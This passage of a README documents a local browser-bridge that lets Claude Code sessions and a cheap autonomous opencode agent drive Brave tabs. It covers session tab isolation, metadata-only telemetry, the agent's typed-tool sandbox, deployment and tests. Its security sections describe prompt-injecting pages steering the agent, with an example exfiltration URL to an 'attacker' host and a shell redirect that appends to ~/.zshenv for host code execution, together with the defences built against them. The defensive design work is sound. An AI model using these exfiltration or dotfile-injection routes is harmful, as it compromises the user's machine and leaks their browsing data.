leaving no orphaned waiter). The audited concurrency core (single `Condition`, no
lock held across a blocking wait, turnstile self-releases in `finally`) is
unchanged.

**Observability (so the next storm is attributable):** a throttle both `log()`s a
distinct `{"event":"throttled","key":…,"reason":…,"sess":…}` line AND emits a
telemetry event (`outcome="throttled"`, `payload.reason`) into `activity.events`.
`payload.sess` is a **coarse, non-reversible** fingerprint (first 8 hex of
sha256 of the `X-Session-Id`) — enough to attribute a flood to a session without
storing the raw id, kept metadata-only (no page content). This is the ONLY event
that carries the session hash.

## Session isolation (concurrent-session tab clobbering)

The transport is correct (each `/cmd` gets a unique cid, a FIFO outbox, and a
cid-correlated reply — no cross-delivery). The old clobber was **semantic**:
every op targeted "the active tab of the last-focused window", so two Claude
sessions driving one instance interleaved on **one shared tab** (A `nav X` then
`getHtml`; B `nav Y` in between; A reads Y). Command-level serialization existed;
per-session (multi-step **workflow**) isolation did not.

**Fix — a per-session owned tab:**

- **Per-session id.** The `browser` skill sends a stable `X-Session-Id` on every
  `/cmd`, derived (in order) from `CLAUDE_CODE_SESSION_ID` (Claude Code's own
  session UUID — identical across every Bash-tool call in a session, verified on
  the 2.1.x CLI) → `CLAUDE_SESSION_ID` (defensive alternate) → `$TMUX_PANE` (each
  session runs in its own tmux pane) → a random token cached under the shell's
  PPID (the Claude Code process, stable across a session's calls). It is used for
  **routing only** and is **never** trusted for auth — bearer + Host still gate
  every request. If two sessions ever resolve the same id they share a tab
  (documented degradation — no worse than before).
- **⚠ Sibling subagents share identity (known limitation).** Per-session
  isolation covers concurrent **top-level** sessions, NOT sibling subagents of
  one parent. Empirically (dumped from inside two parallel subagents) a subagent
  inherits the **parent's** `CLAUDE_CODE_SESSION_ID` *and* runs in the same
  `$TMUX_PANE`, and the harness injects **no** subagent-unique, stable env var
  (no agentId/taskId/tool-use id is visible to the subagent's own shell), so two
  sibling subagents derive the SAME session id and would own the same tab. The
  robust fix is **explicit tab handles**: each such driver runs `browser open`
  (which returns a real `tabId`) and then threads its OWN `--tab <id>` on every
  subsequent op. An explicit `--tab` **overrides** owned-tab routing entirely, so
  two indistinguishable drivers never collide. See SKILL.md → Concurrent drivers.
- **Ownership.** `browser open [url]` creates a tab (background, `active:false`,
  so parallel sessions don't fight over the foreground) and the server records
  `(instance_key, session_id) -> tabId`. That session's tab-scoped ops then route
  to its tab; a session with **no** owned tab falls back to the active tab (the
  one-shot read path). `--tab <id>` overrides explicitly. `browser close` closes
  the tab + drops ownership; `browser release` drops ownership only.
- **Idempotent `open` (no orphaned tab).** A second `open` from a session that
  already owns a **live** tab returns that SAME tab (the server passes the owned
  tabId as `reuseTabId`; the extension reuses it) instead of creating a second
  real tab — so a double `open` never orphans/leaks the first tab. If the owned
  tab is **gone**, `open` transparently creates a fresh one.
- **Self-heal on a vanished owned tab.** If the user manually closes an owned
  background tab, the next tab-scoped op dispatches the stale tabId and the
  extension returns `owned_tab_gone` (ok:false). The server then **drops** that
  session's ownership so the NEXT command self-heals to the active-tab fallback
  (instead of staying wedged to the dead tab until the TTL reclaims it). `browser
  close` clears the mapping **unconditionally** — even when the tab was already
  gone — and the extension treats an already-gone close as success (idempotent).
- **FIFO on remaining contention.** With isolation most sessions use different
  tabs and don't contend. When two commands DO target the same tab (both active,
  or one `--tab`s another's owned tab) they are serialized **FIFO in arrival
  order** — competing commands **queue** (blocking) rather than fail-fast,
  bounded by `cmd_timeout` so a queued command can't block forever. Commands to
  **different** tabs never block each other.
- **Lifecycle (reversible — flag for veto).** Ownership has an idle TTL
  (`BROWSER_BRIDGE_OWNER_TTL`, default 900 s). On expiry the mapping is
  **released** so a dead session doesn't leak ownership, but the real Brave tab
  is deliberately **NOT closed** (never yank a visible tab out from under the
  user) — only an explicit `browser close` closes it.
- **Screenshot — CDP-primary, works on a background tab.** The **primary** path is
  **CDP `Page.captureScreenshot`** (via the `debugger` permission), which captures a
  BACKGROUND / occluded / non-foreground tab directly — so an owned/agent tab that is
  never foregrounded on the user's i3 tiling WM can still be screenshotted, and two
  profiles can each screenshot their own tab. `--fullpage` captures the whole
  scrollable document (CDP only). Attach is **refused on a privileged tab**
  (`assertCdpAttachable`) before any attach.
  - **`captureVisibleTab` fast path** — for a tab that is ALREADY the visible
    foreground tab (and not `--fullpage`), the SW uses the cheap, banner-free
    `captureVisibleTab` first; any failure there simply **falls through to the CDP
    path**. That fast path uses `captureWithRetry`, which **respects Chrome's ~2/sec
    `captureVisibleTab` quota** (retries spaced ≥~600ms; a
    `MAX_CAPTURE_VISIBLE_TAB_CALLS_PER_SECOND` hit waits a ~1s window) so a retry
    never re-trips the quota.
  - `text` / `html` / `eval` also read a background tab directly (no compositing
    needed), so for a pure read an agent/owned tab should read, not screenshot.
  - The transient-error classifier (`isTransientCaptureError` / `isCaptureQuotaError`)
    and the quota-spaced retry (`captureWithRetry`) are pure + unit-tested in
    `extension/protocol.js`; the capture itself needs real Brave, so it stays on the
    manual checklist. Like any `extension/` change, it only takes effect after a
    manual extension **reload** in `brave://extensions`.
- **Backward-compat.** A single session with no `open` (and even no
  `X-Session-Id`) behaves exactly as before: active-tab ops, no `tabId` injected.
  The multi-instance `--instance` targeting, ambiguity/supersede semantics, and
  telemetry are unchanged.

`GET /health` → `{"ok":true,"extension_connected":bool,"count":N,"extension_version_current":"<repo manifest>","instances":[{key,label,instanceId,activeTab,extension_version},…]}`.
Each instance carries its **loaded `extension_version`** (from the `X-Bridge-Ext-Version`
poll header; `null` until a build that reports it), and the bridge carries
**`extension_version_current`** (the manifest version the server reads from the
repo) — eyeball loaded-vs-current to spot a **stale** extension (see the stale note below).
`GET /instances` → `{"ok":true,"count":N,"instances":[…]}`.

## Telemetry (activity pipeline)

Each **handled command** (`getHtml`/`text`/`eval`/`tabs`/`nav`/`screenshot`/
`frames`/`click`/`type`/`key`/`activate`, incl. its error/ambiguous outcomes) emits **one**
event into the personal activity-telemetry pipeline, so browser-skill usage is
first-class self-telemetry in ClickHouse `activity.events`:

- **`source="browser-bridge"`, `kind="cmd"`** — a *distinct* source from the
  collector's `browser` (nav/scroll) source; the two are kept separate.
- **Fields:** `text` = the active-tab bare **domain** (or the op when no domain),
  `duration_ms` = server-side latency, `exit_code` = 0/1, and a tiny `payload`
  JSON `{op, key, outcome[, domain]}` (`key` = the `--instance` routing target,
  empty for the implicit single-instance case; `outcome` ∈
  `ok|no_extension|ambiguous|unknown_instance|superseded|timeout`).
- **METADATA-ONLY (privacy):** it emits **only** the op name, instance key,
  outcome, latency, and the active tab's **bare domain** — **never** the eval
  source, page HTML, screenshot bytes/data-URLs, a full URL with path/query, or
  any page content. For the frame/input ops this specifically means **no frame URLs**
  (the `frames` result lists them to the caller, but telemetry keeps only the bare
  top-level domain), **no typed text** (`type`), and no click selector — the domain is
  derived only from the result's top-level `url`.
- **Best-effort / fire-and-forget:** emitting runs **after** the HTTP response is
  sent and can never delay or break a command — a missing collector, unwritable
  spool, or any exception is swallowed and the command still succeeds. No new
  deps: it reuses the collector's `scripts/collector/keylog/spool_emit.py`
  (single source of truth for the v1 line format), located by its stable
  absolute repo path (`~/workspace/devrc/…`) because `server.py` is deployed as a
  flat `/nix/store` symlink so `__file__` can't find the sibling collector tree.
- `health`/`instances`/`poll`/`result` are noise and deliberately do **not** emit.

Feeds the `activity.events` table (and, once its registry learns the source,
`adoption-scan`). The live end-to-end check (needs the running collector + real
Brave): run any `browser` command, then confirm a `source='browser-bridge'` row
landed in `activity.events`.

## opencode browser-agent (`browser agent "<goal>"`)

An **autonomous** read/navigate agent that offloads open-ended "go read X, tell
me Y" browsing off Claude's context onto a **cheap** model. `browser agent
"<goal>"` (→ the `browser-agent` wrapper) drives opencode headlessly against
DeepSeek `deepseek-v4-flash` (via OpenRouter) in the agent's OWN isolated Brave
tab and returns a compact structured result — never raw HTML.

```
browser agent "<goal>" [--instance K] [--allow-domains …] [--deny-domains …]
                       [--steps N] [--timeout S] [--dry-run]
```

**Flow (the wrapper, `browser-agent`):**

1. `open`s a NEW background tab on instance K and captures its `tabId` (the
   agent's OWN tab — reuses the #175 `open`+`--tab` isolation).
2. Runs `opencode run --format json -m openrouter/deepseek/deepseek-v4-flash
   --agent browser-agent --auto` in a scratch `--dir`, under a **wall-clock
   `--timeout` enforced with a PROCESS-GROUP kill** (`setsid` + `kill -<pgid>`, so
   no opencode child can survive a timeout — the old `timeout --kill-after` only
   killed the direct pid and could orphan a detached child).
3. **Parses opencode's final message** as the required schema
   `{"answer":str,"evidence":[str],"steps_used":int,"status":"ok|partial|blocked"}`.
   On a completed-but-malformed run it re-invokes **exactly once** (`--continue`,
   demanding ONLY the JSON); still malformed → returns `{"status":"blocked",…}`.
   No infinite retry. A hard opencode error (non-zero exit) or a `--timeout` kill
   → `blocked` with no retry.
4. Closes the owned tab on **every** exit path (success / timeout / error /
   tab-gone) — no leaked tabs.

**The action surface: ONE typed tool, NO shell (the PR #180 RCE fix).**

The agent's entire capability is a single **custom opencode tool**, `browser`
(`opencode/tools/browser.js` + its pure-logic sibling `browser_tool_impl.mjs`,
copied into the scratch project's `.opencode/tools/` per run). The model calls it
with TYPED arguments — `op` ∈ {`text`,`html`,`eval`,`nav`,`screenshot`,`frames`,
`click`,`type`,`key`,`activate`,`whoami`} plus optional `selector`/`url`/`js`/`text`/`key`/`frame`/
`maxBytes`/`waitMs` — **never a shell command string, and never a raw-CDP `cdp`/`method`
field** (the CDP ops are bounded typed ops only; see the CDP security model above).

- **The agent's `whoami` is NARROWED — no cross-profile reconnaissance.** The
  server's `whoami_snapshot` iterates every live instance, so a bare passthrough
  would tell the autonomous model what the operator is browsing in *unrelated*
  profiles. The tool's summarizer therefore drops `activeTabDomain` outright (for
  every instance, including the agent's own) and lists only the agent's OWN forced
  instance (`BROWSER_AGENT_INSTANCE`, matched by key or label; an unmatched value
  yields an empty list rather than falling back to "all"). The git HEAD inside
  `server_version` is dropped too — only the version string survives. Why it
  matters: with no `--allow-domains` set, `hostDenied()` permits any host, so a
  leaked `{label:"banking", activeTabDomain:"chase.com"}` is one
  `nav https://attacker/?d=chase.com` away from exfil by a model that is by design
  reading prompt-injecting pages. This is the same leak that keeps `tabs` out of
  the agent's op set ("`tabs` would leak other tabs' URLs"); `whoami` had
  reintroduced a narrower version of it. The op's stated purpose — *which host and
  which profile am I on* — is fully intact. The `browser whoami` CLI is unchanged;
  the operator still sees everything.
- **`upload` is NOT in the agent's op set** (11 ops, above — no `upload`). The
  `browser` CLI keeps it: an operator choosing a path by hand is a legitimate,
  audit-logged action. The autonomous model is different — it is by design pointed
  at untrusted, prompt-injecting pages, and `upload` takes a caller-chosen
  ABSOLUTE path with no allowlist, so a page could effectively pick the file whose
  contents get posted to it. It is therefore absent from all four places that
  define the agent's surface — `browser.js`'s typed `op` enum, `browser_tool_impl.mjs`'s
  `ALLOWED_OPS_DEFAULT`, the agent-md capability table, and this list — which
  `tests/browser_tool.test.mjs` parses and asserts identical, so they cannot drift.
  It stays REACHABLE for a deliberate opt-in via `BROWSER_AGENT_ALLOWED_OPS` (see
  the env-var table below); nothing depends on opencode's schema validation to
  enforce this, since whether an out-of-enum `op` is rejected before `execute()` is
  an unpinned implementation detail of opencode.

- **Why this replaced the bash tool.** The MVP gave the agent opencode's *bash*
  tool, permission-scoped to `browser --tab <id> *`. opencode denies by matching
  each shell *command* node against the deny rule, so chaining (`;`/`&&`/`|`/
  `$()`/backticks) was blocked — but a shell OUTPUT REDIRECTION
  (`browser --tab N eval '…' >> ~/.zshenv`) is **not a separate command node**: it
  attaches to the allowed `browser` command, so the wildcard glob matched it and
  the shell performed the redirect. A hostile page could induce the autonomous
  model to append attacker text to a sourced dotfile (`~/.zshenv`, sourced by
  every `zsh -c` incl. Claude's Bash tool) → **host RCE**. The raw-shell surface
  was the root cause; a typed tool eliminates it — there is no command string, so
  no `>`/`>>`/`;`/`|`/`$()`/backtick surface exists at all.
- **bash (and edit/read/webfetch/…) fully DENIED.** The per-run agent def
  (templated from `opencode/browser-agent.md`) sets `permission: {"*": deny,
  browser: allow}`. Verified with `opencode debug agent browser-agent`: the
  resolved tool set is `{bash:false, read:false, edit:false, write:false,
  webfetch:false, …, browser:true}` — only the typed tool is enabled.
- **Runtime fail-closed tool-set gate (this is what makes an unverified opencode
  version SAFE).** The denial above is a *property of the resolved config*, not
  something the wrapper can assume — a future opencode could resolve it
  differently. So BEFORE opening a tab or spending a single model
  token, the wrapper runs `opencode debug agent browser-agent` (a **read-only,
  model-free config dump**) in the scratch project and parses the resolved `tools`
  map. It **refuses to run** (`die`, non-zero, model never invoked) unless
  `browser:true` **AND** every host tool (`bash`/`read`/`edit`/`write`/`webfetch`)
  is present **AND** `false`. Any uncertainty fails closed: unparseable output, a
  missing `browser` (custom tool not loaded on an unsupported version), a host
  tool still `true`, **or** a host tool absent from the output (absence must not
  read as "disabled"). This turns the version-skew from a latent "runs unconfined"
  landmine into a loud, safe refusal — on any opencode where the host-tool denial
  did not take, `browser agent` refuses rather than running the model with a shell.
  Because the gate runs **before** the tab is opened, a gate failure leaks no tab.

  *Prerequisite:* an opencode whose `debug agent` reports a browser-only tool set.
  **Both hosts run 1.18.4 and both resolve browser-only** (verified: the dump
  parses to exactly one enabled tool, `browser`). There is no version-skew caveat
  here any more.

  *The failure mode that actually bites — capture the dump to a FILE, never a
  pipe.* opencode does not reliably flush stdout before exiting when stdout is a
  pipe, so a `$(opencode debug agent …)` command substitution can return a
  TRUNCATED prefix. Measured on these hosts: `debug skill` 65536 B via pipe vs
  293329 B via file (deterministic across 3 runs); `debug v2` 55276 / 55276 /
  6103 B across three identical pipe runs — two different cut points *and*
  run-to-run variance, i.e. a flush race on exit, not a fixed buffer cap.
  Truncated JSON is unparseable, so the gate correctly fails closed — but the
  refusal reads `unparseable debug-agent tool set: Unterminated string…`, which
  looks exactly like an unsupported-version problem and misdirects the diagnosis.
  The wrapper therefore redirects the dump to `$SCRATCH/gate.json` and parses the
  file; the same command that failed via `$(...)` parses cleanly to `['browser']`
  from a file. **Reproduce the gate the same way** — `opencode debug agent
  browser-agent > /tmp/gate.json` — never through a pipe. The wrapper's three
  refusal messages are deliberately distinct so you can tell them apart: *failed
  to RUN (non-zero exit)* vs *produced NO output* vs *output was UNPARSEABLE* vs
  *tool set is not browser-only*.
- **The model cannot choose the tab / instance / domain policy.** The wrapper
  FORCES them on the tool via env (`BROWSER_AGENT_TAB`/`_INSTANCE`/
  `_ALLOW_DOMAINS`/`_DENY_DOMAINS`/`_DRY_RUN`, + inherited `BROWSER_BRIDGE_*`).
  The tool reads the forced tab and posts it explicitly — an explicit `--tab`
  overrides the server's owned-tab routing, so the model can never target another
  tab. Enforcement (op allowlist + domain deny + forced tab) lives IN the tool
  (`browser_tool_impl.mjs`), unit-tested in `browser_tool.test.mjs`.
- **Non-http(s) nav schemes are DENIED.** A `nav` is refused before any bridge
  fetch unless its scheme is `http:`/`https:`. `file:`/`data:`/`about:`/
  `javascript:`/`chrome:`/`blob:`/… all have an empty hostname, so the host
  allow/deny gate would treat them as "no host → not gated" and let them slip past
  the operator's `--allow-domains` confinement (loading attacker HTML in the owned
  tab, running inline script, or — with the browser's file-URL toggle on — reading
  a local file). The refusal reason is `nav_scheme_denied:<scheme>`; an
  unparseable/schemeless target is refused too (`nav_scheme_denied:<none>`). This
  is a hard gate, independent of the allow/deny lists.
- **Domain deny is best-effort.** For http(s) navs the tool refuses a `nav` to a
  denied host (and scans an `eval` for a literal denied host), but it cannot see a
  page's own client-side redirect after an allowed nav — the bridge navigates and
  the tool only sees the op it issued. `--deny-domains` is defence in depth, not a
  guarantee; the real isolation is the own-tab lock. *Follow-up:* server-side
  enforcement against the tab's resolved post-nav URL would make it binding.
- The `browser` tool talks to the loopback bridge over HTTP directly (bearer +
  `Host: 127.0.0.1` + `X-Session-Id` + the forced `tab`) — **zero subprocess, zero
  shell**. A metadata-only audit line per op (`#173`) goes to a scratch
  `tool-audit.jsonl` (op + decision + host — never page content).

**Harness (the agent-md body):** a strict single-tool contract, "prefer `text`
over `html`", the step budget, the required final-answer schema, and the domain
rules — so a cheap model is reliable *by construction*.

**opencode JSON envelope (verified live, opencode 1.18.4):** `--format json`
emits **newline-delimited JSON events** (NOT one document): `{"type":"step_start",
…}`, `{"type":"text","part":{"type":"text","text":"…"}}`, `{"type":"step_finish",
"part":{…,"tokens":{…},"cost":…}}`. The assistant answer is in the `text` parts;
`browser-agent-parse.py` concatenates them and extracts the last balanced schema
object (defensively, so a future envelope change can't break the parse).

**Cost / latency (est.):** ~$0.005–0.008 and ~10–25 s per task on
`deepseek-v4-flash` (cold-start opencode can take longer — hence the generous
120 s default `--timeout`); vs ~$0.75+ and a context-burn if the same loop ran in
Claude. **Privacy:** the pages the agent reads go to OpenRouter/DeepSeek —
consciously accepted; don't route high-secret pages casually.

### Deploy (per host — operator step; NOT done by the wrapper)

The wrapper is self-contained EXCEPT it needs (1) `opencode` on PATH, (2) the
OpenRouter key already in opencode's auth store (`~/.local/share/opencode/auth.json`
on both hosts — do NOT add a key). It writes BOTH the per-run agent def AND the
typed tool into its scratch `--dir`, so a live run needs no global install. For
interactive use (`opencode --agent browser-agent`), also symlink the canonical def
**and** the tool into opencode's config dir:

```bash
mkdir -p ~/.config/opencode/agents ~/.config/opencode/tools
ln -sf ~/workspace/devrc/scripts/browser-bridge/opencode/browser-agent.md \
       ~/.config/opencode/agents/browser-agent.md
# BOTH tool files — browser.js is the tool; browser_tool_impl.mjs is its
# (non-tool) pure-logic sibling, imported by it. opencode globs `*.{ts,js}` so the
# .mjs is NOT registered as a tool, but it MUST sit alongside browser.js.
ln -sf ~/workspace/devrc/scripts/browser-bridge/opencode/tools/browser.js \
       ~/.config/opencode/tools/browser.js
ln -sf ~/workspace/devrc/scripts/browser-bridge/opencode/tools/browser_tool_impl.mjs \
       ~/.config/opencode/tools/browser_tool_impl.mjs
```

(The global def keeps the `__STEPS__`/`__MODEL__` placeholders — inert on its own;
the wrapper substitutes them per run.)

**opencode version.** The custom-tool mechanism (`.opencode/tools/*.js`,
`permission: {"*": deny, …}`) is **verified on 1.18.4, which is what BOTH hosts
run** — `opencode debug agent browser-agent` resolves to `bash:false … browser:true`
(exactly one enabled tool) on each, plus an end-to-end `opencode debug agent …
--tool browser` run against a fake bridge. The wrapper still writes the tool to
BOTH `.opencode/tools/` and `.opencode/tool/` as cheap insurance against a future
tool-dir rename. If you upgrade opencode and it stops resolving browser-only, the
runtime tool-set gate refuses the run — that is the intended, safe outcome; fix
the config or roll back rather than weakening the gate.

⚠ **When checking the gate by hand, redirect to a FILE.** `opencode debug agent … |`
/ `$(opencode debug agent …)` can return truncated output (flush race on exit — see
the tool-set-gate section above), which reads as an unsupported-version failure and
sends you down the wrong path. Always `> /tmp/gate.json` first.

**Env vars the agent layer reads** (all are operator/test seams — the MODEL can
set none of them; it only ever supplies typed tool args):

| var | default | what it does |
|---|---|---|
| `BROWSER_AGENT_ALLOWED_OPS` | *(unset → the 11-op `ALLOWED_OPS_DEFAULT`)* | space/comma list that REPLACES the agent's op allowlist wholesale. Narrows it (`"text,html"`) or deliberately re-enables an off-by-default op — this is the ONLY supported way to give the autonomous agent `upload` |
| `BROWSER_AGENT_OPENCODE` | `opencode` | the opencode binary (test seam) |
| `BROWSER_AGENT_BROWSER_BIN` | `./browser` | the `browser` CLI used for open/close/probe (test seam) |
| `BROWSER_AGENT_MODEL` | `openrouter/deepseek/deepseek-v4-flash` | model baked into the per-run agent def |
| `BROWSER_AGENT_TEMPLATE` | `opencode/browser-agent.md` | the agent-md template to instantiate |
| `BROWSER_AGENT_TOOL_DIR` | `opencode/tools` | dir holding `browser.js` + `browser_tool_impl.mjs` |
| `BROWSER_AGENT_KEEP_SCRATCH` | `0` | `1` keeps the per-run scratch dir (transcripts, `gate.json`, `tool-audit.jsonl`) for debugging |
| `BROWSER_AGENT_READY_ATTEMPTS` | `3` | open→readiness-probe retry budget |
| `BROWSER_AGENT_READY_BACKOFF` | `0.4` | seconds between readiness retries |
| `BROWSER_AGENT_TAB` / `_INSTANCE` / `_ALLOW_DOMAINS` / `_DENY_DOMAINS` / `_DRY_RUN` / `_AUDIT` / `_SESSION_ID` | *(set by the wrapper per run)* | the FORCED tab / instance / domain policy / dry-run / audit-log path / session id the tool reads. Not for hand-setting — the wrapper owns them |
| `BROWSER_BRIDGE_HOST` / `BROWSER_BRIDGE_PORT` | `127.0.0.1` / `8788` | the loopback bridge the tool POSTs to (inherited) |
| `BROWSER_BRIDGE_TOKEN_FILE` | `~/.config/browser-bridge/token` | bearer-token file the tool reads |

### Manual live check (the one step that needs real Brave + a real model — CANNOT run in CI)

The unit tests use a **mocked opencode/bridge** (no live model, no Brave — that
loop can't run in CI). Two deterministic checks CAN be run on a host with opencode
installed (no model, no Brave) and are the fastest way to confirm the security
contract after a change:

```bash
# (a) the agent is bash-DENIED and only the typed tool is enabled (resolve, no model):
S=$(mktemp -d); mkdir -p "$S/.opencode/agents" "$S/.opencode/tools"
sed -e 's/__STEPS__/12/g' -e 's#__MODEL__#openrouter/deepseek/deepseek-v4-flash#g' \
  scripts/browser-bridge/opencode/browser-agent.md > "$S/.opencode/agents/browser-agent.md"
cp scripts/browser-bridge/opencode/tools/browser.js \
   scripts/browser-bridge/opencode/tools/browser_tool_impl.mjs "$S/.opencode/tools/"
# NOTE the FILE redirect — a pipe/`$(...)` can truncate opencode's stdout (flush
# race on exit) and turn a healthy config into a bogus "unparseable" failure.
( cd "$S" && opencode debug agent browser-agent ) > "$S/gate.json"
python3 -c \
  'import json,sys; t=json.load(open(sys.argv[1]))["tools"]; assert t["bash"] is False and t["browser"] is True; print("OK: bash denied, only browser enabled")' "$S/gate.json"
# (b) the tool refuses a bad op / disowned tab (executes the tool, no model, no bridge):
( cd "$S" && opencode debug agent browser-agent --tool browser --params '{"op":"open"}' ) 2>&1 | grep op_not_allowed
```

To verify the **full** end-to-end (needs real Brave + a real model):

1. Deploy the agent def AND the tool (see Deploy above); `browser health` →
   `extension_connected:true`.
2. `browser agent "go to news.ycombinator.com and report the top 3 story titles"`.
3. Assert: a NEW background tab opened (NOT your active tab), it navigated +
   read via the typed `browser` tool, it returned the compact schema with 3
   titles, your active tab was untouched, and the tab was closed afterwards. Check
   the scratch `tool-audit.jsonl` records only op/decision metadata (no page text).

## Icon

A gruvbox-tinted **bridge / chain-link** glyph (blue loopback node linked to the
yellow browser node on a dark rounded field). Source is
`extension/icons/icon.svg`; the committed PNGs (`icon-16/32/48/128.png`) are
rasterised from it and wired into `manifest.json` (`icons` + `action.default_icon`).
Regenerate after editing the SVG:

```bash
cd extension/icons
nix-shell -p librsvg --run 'for s in 16 32 48 128; do rsvg-convert -w $s -h $s icon.svg -o icon-$s.png; done'
```

## Running the tests

```bash
# Python (server.py) — headless, no Brave, no network beyond loopback:
nix-shell -p python312Packages.pytest --run "pytest scripts/browser-bridge/tests"

# Extension protocol logic + CDP helpers + typed tool (pure, no chrome.* runtime):
nix-shell -p nodejs --run "node --test scripts/browser-bridge/tests/*.test.mjs"
```

`tests/fixtures/oopif-rig/` is NOT part of either suite — it is a pair of manual
live-verify fixtures (loopback-resolving registrable sites served by one `python3 -m
http.server`) reproducing **nested** cross-origin OOPIFs on demand, the only known
reliable way to exercise the CDP frame path against real Brave: **Check A** is a 3-domain
grandchild rig (and, by construction, the confirmation that OOPIF targets really are typed
`iframe` — if they weren't, the type filter would drop the grandchild and Check A would
fail); **Check B** is a 7-level alternating-2-domain "deep" rig that discriminates a
binding `OOPIF_MAX_DEPTH` from the untagged-`sessionId` degradation. Its README has the
serve command, both verify sequences with an expected-outcome table, and the ⚠
`vcap.me`-now-resolves-publicly warning.

The CDP (chrome.debugger) ops are covered deterministically without a real browser:
`tests/cdp_protocol.test.mjs` unit-tests the pure decision layer (attach-scope
refuse-before-attach, always-detach on success/error/detach-failure, frame
enumeration/resolution, key/coordinate math, injection-safe expression builders,
and the **SW-side CDP timeouts**: a hung attach/command/detach settles with a
`cdp_timeout:<phase>` error within a bounded budget — never wedging the poll loop
— a discarded/unloaded tab fails fast with `tab_discarded`, and the no-wedge
guarantee that the next op is still processed after a hung one);
`tests/browser_tool.test.mjs` proves the typed tool forces the own-tab, forwards
only whitelisted typed fields, and **drops any smuggled `cdp`/`method`/`params`
field** (the RCE-class regression guard); `tests/test_server.py` proves the new ops
are dispatched + tab-scoped, enforce required fields, forward `frame`/`selector`/
`text`/`key` verbatim, keep telemetry metadata-only (no frame URLs / typed text),
and count against the rate limit. The real chrome.debugger attach/detach behaviour
needs live Brave — see **Manual live check** below.

The Python suite (`tests/test_server.py`) also runs as part of
`scripts/run-tests.sh` (it's in the hermetic set). It covers: token gen + `0600`
perms, `401`/`403` gates (incl. the instance-scoped `/poll` + `/result`),
per-instance `/health` + `/instances`, a `/cmd` round-trip against an in-process
fake extension, `503`/`504` no-extension/timeout paths, unknown-op + bad-JSON
errors, request↔reply id correlation (incl. out-of-order), and the multi-instance
registry: routing by key, independent queues (no cross-delivery), the ambiguity
error, unknown-target, label-vs-auto-id key resolution, supersede-on-duplicate
(incl. an in-flight command resolving to `superseded` with no orphaned waiter,
the displaced poll returning the distinct `409 superseded` signal instead of the
idle `204`, and the supersede being logged exactly once per displacement — the
no-churn/livelock-fix contract), legacy no-handshake back-compat, and an icon
sanity check (each declared PNG exists and its IHDR size matches). It also covers
**session isolation**: `open` recording `(instance,session)->tabId`, two sessions
getting distinct ownership, ops routing to the owning session's tabId (and the
interleaved-two-sessions clobber test), the active-tab fallback + `--tab`
override, `close`/`release` (drop ownership; `close` dispatches a remove-shaped
command, `release` never touches the extension), `tabs` ownedTabId annotation,
per-tab FIFO serialization (same-tab commands serialize in arrival order,
different tabs don't block, a queued command still honours `cmd_timeout`), TTL
reclaim (injected clock — released, not closed), the `no_owned_tab` error, the
session id being routing-only (bearer/Host still enforced), and backward-compat
(single session, no open → unchanged active-tab dispatch). It also covers the
**self-heal + idempotency hardening**: an `owned_tab_gone` op dropping the stale
ownership (self-heal to active-tab) while an unrelated `--tab` gone tab does NOT
evict a healthy mapping, `close` clearing ownership even when the tab was already
gone, an idempotent double `open` returning the reused tab (no orphan) vs opening
fresh when the owned tab is gone, a malformed `tab` (list/dict/bool) returning a
clean `400 bad_tab` instead of a 500 (+ the `_coerce_tab`/`_is_tab_gone` helper
units), and an explicit `--tab` overriding owned-tab routing (the subagent
escape hatch). It also covers the **per-instance concurrency backstop**: the
token-bucket admission (burst passes then `rate_limited`, refill-over-fake-time
resume, cap-at-burst), the queue-depth cap (`queue_full` at `MAX_QUEUE`, drain
resumes), strict per-instance isolation (throttling A never throttles B), the
disable path (rate=0/max_queue=0 → unlimited), a rejected submit leaving NO
turnstile/waiter residue (no deadlock), the HTTP `429 rate_limited` + throttle
telemetry event (metadata-only, a COARSE non-reversible session hash — never the
raw id), the HTTP `429 queue_full`, that the production defaults never throttle a
normal small burst, and the `browser` CLI backing off (non-zero exit) on a 429.
It also covers the **`text` cheap-read op** (dispatched + tab-scoped like
getHtml; selector/maxBytes passthrough; the CLI subcommand's default/selector/cap
arg parsing; and telemetry staying metadata-only — the page text never emitted)
and the `normalizeText` whitespace-collapse + UTF-8-safe byte-cap (node).

The **`browser agent`** slice, all headless (NO live model, NO Brave, NO bridge):

- `browser_tool.test.mjs` (node) — the AUTHORITATIVE coverage for the TYPED-tool
  RCE fix (`opencode/tools/browser_tool_impl.mjs`, `fetchImpl`/`readToken` mocked):
  the op allowlist (open/close/tabs/release refused), the FORCED tab (the model
  cannot override it — there is no tab arg), domain deny on `nav` (+ allowlist mode
  + the best-effort `eval` scan), the request shape (bearer / `Host` / `X-Session-Id`
  / mapped op / forced tab / instance target), `text` selector+maxBytes, the
  dry-run intercept, an op-level bridge failure surfacing as a refusal, and the
  screenshot no-blob rule.
- `test_browser_agent_parse.py` (python) — the opencode-transcript → schema parser
  (real-shaped stream, tool-event ignore, embedded-in-prose, multi text-part
  concat, last-schema-wins, brace-in-string, no-JSON/missing-keys → none,
  loose-field normalization, exit codes).
- `test_browser_agent.py` (python, fake `opencode` + fake `browser` CLI) — the
  wrapper lifecycle + security wiring: arg parsing; own-tab open→close on EVERY
  exit path (success/timeout-kill/opencode-error/open-failure); the agent def
  DENYING bash and allowing ONLY the custom tool (`"*": deny` + `browser: allow`,
  no `browser --tab … *`, no `bash:`); the typed tool being copied into the scratch
  project; the wrapper FORCING tab/instance/domain policy on the tool via env; NO
  shell-string path remaining (no PATH shim, the task message points at the typed
  tool); the **process-group kill on timeout** (a fake opencode forks an
  inherited-group straggler → asserted reaped, no orphan); schema parse + EXACTLY
  ONE `--continue` retry then `blocked`, no-retry on a hard error.

Current totals (measured): **208 Python** + **229 node**, of which
`nested_oopif.test.mjs` is **43** — the nested-OOPIF (#211) coverage. It models a
**HOSTILE** page, not a cooperative one: worker/service-worker/page targets ignored, a
`new Worker(location.href)` target that shares the wanted frame's url neither shadowing it
nor forcing a denial-of-service `ambiguous_frame`, `chrome-extension:`/`file:`/`devtools:`/
`about:`/`data:`/`javascript:` children refused (and never descended into), foreign-tab
events dropped, an omitted `tabId` failing closed, the experimental `filter` param
failing soft, the wait ceiling holding while the descend queue stays non-empty, and the
untagged-`source.sessionId` degradation pinned to its ACTUAL behaviour. It also carries a
**live-failure regression set**: sub-session events with NO `tabId` still resolving a
grandchild via the parentage fallback (the run-#1 repro), the 7-level deep-rig shape
resolving at depth 5 and refusing at depth 6, an unknown parent session still rejected
(the fallback is not blanket trust), a present-but-foreign `tabId` still losing, and the
`cascade[…]` diagnostic's content + 20-entry cap. Plus a GRANDCHILD frame
resolving through TWO attach levels (the second `Target.setAutoAttach` asserted to be sent
ON the child's `sessionId`), a depth-3 cascade, the DIRECT-child single-level path
